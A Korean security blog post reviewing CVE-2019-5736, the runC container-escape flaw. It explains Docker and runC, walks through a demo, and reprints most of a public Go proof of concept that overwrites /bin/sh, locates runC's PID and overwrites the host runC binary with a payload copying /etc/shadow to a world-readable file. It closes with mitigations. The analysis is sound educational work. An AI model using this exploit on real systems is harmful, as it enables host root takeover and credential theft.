---
layout: post
current: post
cover: 'assets/images/linux/jobs/runC_Container/5736-4.png'
navigation: True
title: CVE-2019-5736 (runC Container 취약점)
date: 2019-03-27 17:43:00
tags: Posts
class: post-template
subclass: 'post tag-linux'
author: Sulla
---

## CVE-2019-5736 (runC Container 취약점)

안녕하세요. Sulla임돠!

2월 11일 **docker**관련 런타임인 **runC** 관련 취약점 **CVE-2019-5736** 공개 되었습니다. 
공개된지 1주일도 안지나 **POC**가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.

그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.

## [**본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.]**

먼저 **docker**가 뭔지...**runC**가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(**귀차니즘** 아닙니다.....)

우선 **docker**란 **Linux** 기반의 **container runtime 오픈소스 플랫폼** 입니다. 쉽게 말해 **Container 관리 플랫폼**이며, **VM**(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 **접근성**과 메모리 점유등의 **성능**의 차이를 보입니다.("**가상화**"가 목표이긴 합니다.)

<figure>
  <img data-action="zoom" src='{{ "/assets/images/linux/jobs/runC_Container/5736-1.png" | relative_url }}' alt='[그림 5736-1]'>
</figure>

Docker의 기본 구성을 위 그림과 같이 표현했습니다. 각각의 역할을 알아 보겠습니다.

- Docker Engine : 사용자와 상호작용을 합니다.
- Containerd : 직/간접적으로 호스트에서 컨테이너 전체 라이프 사이클을 관리합니다. (이미저 전송 및 저장, 컨테이너 실행 및 관리(runC 사용), 네트워크 인터페이스 관리 등)
- Containerd-shim : runC를 사용해 컨테이너를 시작된 후에 runC가 종료 되어도 컨테이너가 실행 되도록합니다.
- runC : 컨테이너를 실행하는 런타임이며, CLI 툴 입니다. (리눅스 커널 네임스페이스, Cgroups(프로세스의 자원 사용을 제한하는 커널 기능), Seccomp(리눅스 커널에서 샌드 박싱 메커니즘을 제공하는 보안 기능), 리눅스 보안 모듈 등)

기본 구성 및 역할에 대하여 알아봤고 **CVE-2019-5736** 취약점에 직접적인 영향을 미치는 runC에 대해서 알아 보겠습니다.

**runC**는 **container**의 **생성/실행** 등을 위한 기본적인 기술이며 **CLI** 도구입니다. 즉, **container**의 **조작**을 위해 존재 한다고 생각하면 될 것 같습니다. **runC**는 Docker, containerd, Podman 및 CRI-O가있는 **컨테이너의 기본 런타임**으로 사용됩니다.

그럼 이번 포스팅의 주인공인 **CVE-2019-5736**에 대해서 알아보겠습니다.

# CVE-2019-5736

해당 취약점은 위에서 알아본 **runC**에서 발생하는 취약점입니다. ****컨테이너 내부에서 **루트 권한**으로 악의적인 프로세스를 실행할 경우 **runC 버그**를 이용하여 컨테이터를 실행하는 **호스트에 대한 루트 권한**을 탈취하는 취약점입니다. 따라서, 서버에 대한 접근 및 해당 서버의 다른 컨테이너 또한 접근이 가능합니다. 

쉽게 말해 **악성 컨테이너**를 통해 **호스트 서버의 루트 권한 탈취**가 가능하게 됩니다.

해당 취약점의 트리거 방법은 다음중 하나 입니다.

- **컨테이너 내부의 악성 프로세스 실행(루트로 실행되는 )**
- **악성 docker 이미지를 실행**

해당 취약점을 트리거 하기 위해서는 위에서도 언급했 듯 **컨테이너 내부**에 **루트 권한**이 있어야 합니다. 

화면 구성은 위쪽은 **Host Server**, 아래쪽은 **Container** 입니다.

<figure>
  <img data-action="zoom" src='{{ "/assets/images/linux/jobs/runC_Container/5736-2.png" | relative_url }}' alt='[그림 5736-2]'>
</figure>

진행 자체는 굉장히 간단하게 진행됩니다.(물론 저는 삽질 했습니다......Aㅏ.....) 먼저 **Host Server**쪽에 해당 파일이 없음을 확인 합니다. 후에는 컨테이너에서 악성 파일을 실행하면 준비가 끝납니다. 함정 처럼 **/bin/sh**를 **#!/proc/self/exe** 바꿔놓고 기다리는 단계입니다.

<figure>
  <img data-action="zoom" src='{{ "/assets/images/linux/jobs/runC_Container/5736-3.png" | relative_url }}' alt='[그림 5736-3]'>
</figure>

그리고 호스트가 컨테이너쪽으로  **docker exec** 명령을 통해 **/bin/sh**의 실행을 명하게 되면 위에서 설치해뒀던 함정이 발동하게 됩니다. 함정 카드..... **(/bin/sh를 쓸것이라 추측하고 세팅 하는겁니다.)** 
다음으로 **runC**의 **PID**를 찾고 **핸들링(O_PATH ,O_WRONLY 플래그 사용)**을 위한 여러 과정을 거치고 최종적으로 호스트의 **runC** 바이너리 파일을 **악성 runC** 로 변조되며 악성 파일에 미리 정의 되있던 행위를 **호스트**쪽에서 **루트 권한**으로 수행하게 됩니다.

<figure>
  <img data-action="zoom" src='{{ "/assets/images/linux/jobs/runC_Container/5736-4.png" | relative_url }}' alt='[그림 5736-4]'>
</figure>

처음에는 없던 shadow 파일이 root 권한으로 생성된 것을 확인할 수 있습니다. 해당파일을 열람시 실제 shadow 파일임을 확인 가능합니다.

<figure>
  <img data-action="zoom" src='{{ "/assets/images/linux/jobs/runC_Container/5736-5.png" | relative_url }}' alt='[그림 5736-5]'>
</figure>

위 과정을 거치면서 **Host Server**쪽의 runC 파일이 변조됩니다. 해쉬값을 비교하면 쉽게 확인 가능하며 위쪽 해쉬값이 원본이면 아래쪽은 변조된 runC 바이너리의 해쉬값입니다.

두 번째 방법의 경우는 첫 번쨰와 원리는 같으며 차이점은 악성 docker 이미지를 생성해서 배포하고 피해자는 해당 이미지를 다운받아 실행하게 되면 위에서와 같은 일련의 동작들을 수행하게 됩니다.

보신것처럼 **Container** 쪽에서 **Host Server**의 **root** 권한으로 악의적인 행위가 가능한 취약점입니다.

어쩌다 이런 일이 생기는지 코드를 보면서 확인 해보겠습니다. (해당 poc코드는 go로 작성 되었습니다.)

    var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
    
    func main() {
    	fd, err := os.Create("/bin/sh")
    	if err != nil {
    		fmt.Println(err)
    		return
    	}
    	fmt.Fprintln(fd, "#!/proc/self/exe")
    	err = fd.Close()
    	if err != nil {
    		fmt.Println(err)
    		return
    	}

우선 **Container**에서 악성 프로세스를 실행하게 되면 위 코드가 실행됩니다. 

1라인의 행위를 위해 아래의 코드들이 쭉 진행됩니다.

코드의 4라인에서 /bin/sh 를 생성 하고 fd에 저장 합니다. 다음으로 9라인에서 #!/proc/self/exe를 fd에 저장 합니다. Fprintln()함수는 첫 번째 인자에 두 번째 인자를 전달하는 기능을 수행 합니다. 첫 번째 인자인 fd는 /bin/sh이며 여기에 /proc/self/exe가 저장 되겠죠.

위 코드의 동작을 해석 하자면 9라인의 **#!/proc/self/exe(**해당 프로세스를 위해 실행된 바이너리를 가리키는 모든 프로세스에 대한 **커널**이 만든 **심볼릭 링크**입니다.**)**는 현재 실행된 프로세스를 어떤놈이 실행 시켰는지에 대해 가리킵니다. 현재 실행된 프로세스는 Host에 의해서 실행된 /bin/sh 이죠. 따라서 /bin/sh을 실행 시킨놈은 Host의 **runC**입니다.
다시 정리 해본다면, Host에서 Container의 /bin/sh을 **docker exec**를 통해 실행 하는데 이 때 **runC**가 사용 됩니다. 결국 **#!/proc/self/exe**가 가리키는 놈은 **Host의 runC**가 되고 **/bin/sh**는 결국 Host의 **runC**가 됩니다.
여기가 **CVE-2019-5736** 취약점의 주요 원인이라 판단이 됩니다. **/proc/self/exe**가 가리키는 것에 대해서 **부적절하게 처리함**으로서 위와 같은 행위가 가능해 지는것이죠.

    var found int
    	for found == 0 {
    		pids, err := ioutil.ReadDir("/proc")
    		if err != nil {
    			fmt.Println(err)
    			return
    		}
    		for _, f := range pids {
    			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
    			fstring := string(fbytes)
    			if strings.Contains(fstring, "runc") {
    				fmt.Println("[+] Found the PID:", f.Name())
    				found, err = strconv.Atoi(f.Name())
    				if err != nil {
    					fmt.Println(err)
    					return
    				}
    			}
    		}
    	}

다음 코드에서는 runC가 구동 되는 동안 runC를 덮어쓸 수 없기 때문에 이를 해결 하기위한 코드가 짜여져 있는데 이 때 필요한 **runC의 PID를 찾기위한 코드**입니다. /proc/[PID]/cmdline(해당 PID를 갖는 프로세스가 어떤 command로 실행 되었는지를 나타냅니다.)에 있는 모든 파일에서 runC를 찾고 결과적으로 runC의 PID를 확보 합니다.
즉, 모든 PID를 대상으로 어떤 친구가 runC를 실행 했는지 찾아 내는 과정입니다.

    var handleFd = -1
    	for handleFd == -1 {
    		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
    		if int(handle.Fd()) > 0 {
    			handleFd = int(handle.Fd())
    		}
    	}
    	fmt.Println("[+] Successfully got the file handle")
    
    	for {
    		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
    		if int(writeHandle.Fd()) > 0 {
    			fmt.Println("[+] Successfully got write handle", writeHandle)
    			writeHandle.Write([]byte(payload))
    			return
    		}
    	}

다음 코드에서는 위에서 찾아낸 runC의 PID값을 이용해 파일 핸들을 얻어냅니다. 이 핸들을 이용해 **/proc/self/fd/파일 서술자**의 **파일 핸들**을 얻습니다. 해당 파일 핸들을 유지하며 Host의 runC를 악성 runC로 바꾸는 등의 권한을 얻게 됩니다.

위에서의 과정에서 보이듯 **rudC**의 **파일 서술자(/proc/self/exe)**에 대한 처리 미흡으로 권한 상승이 가능해지는 취약점입니다.

# 대응 방법

취약점의 동작 조건중 하나는 **Container**에의 **root**권한이 있어야 합니다. 또한 **출처를 알 수 없는 이미지**를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
전부는 아니지만 대부분의 Cloud Container system이 **CVE-2019-5736** 취약할 것 입니다. 

1. **Container root 권한 제한**
2. **신뢰할 수 없는 이미지 파일 사용 자제**
3. **runC 등 최신 버전 유지**
4. **컨테이너 시작 시 호출되는 바이너리의 임시 백업 바이너리 생성**
5. .......

해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.

영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)

감사합니다. 

## References 참고 문헌

- https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html
- https://brauner.github.io/2019/02/12/privileged-containers.html
- https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/
- https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/
- https://vulmon.com/exploitdetails?qidtp=EDB&qid=46369
- https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
- https://github.com/rancher/runc-cve
- https://github.com/Frichetten/CVE-2019-5736-PoC
- https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html